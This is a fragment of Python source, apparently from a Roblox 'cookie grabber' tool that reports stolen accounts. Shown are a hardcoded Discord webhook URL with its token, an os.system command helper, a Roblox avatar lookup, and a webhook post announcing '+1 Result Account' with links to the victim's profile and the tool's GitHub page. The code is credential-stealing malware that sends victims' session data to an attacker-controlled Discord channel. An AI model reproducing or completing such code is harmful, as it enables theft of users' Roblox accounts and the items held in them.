...
webhookk = "https://discord.com/api/webhooks/1116457563031089234/gTPd42vaJG0WnmFtGV5hpZCqg07qe9obyQm5gUB1mWAbOoY9BZwfjBdBgk1jc5f-ZrMB"
def command(c):
    os.system(c)
def cls():
    os.system("cls")
...
response = requests.get(f"https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds={rid}&size=352x352&format=Png&isCircular=false")
headshot = response.json()['data'][0]['imageUrl']
...
discord.post(
    username="BOT - Hitters 🍪",
    avatar_url="https://cdn.discordapp.com/attachments/1019677519974244493/1025380347417985097/a339721183f60c18b3424ba7b73daf1b.png",
    embeds=[
        {
            "username": "BOT - Hitters 🍪",
            "title": "💸 +1 Result Account 🕯️",
            "description" : f"[Github Page](https://github.com/Mani175/Hitters-Cookie-Grabber) | [Rolimons]({rolimons}) | [Roblox Profile]({roblox_profile})",
            "color" : 663399,
            "fields": [
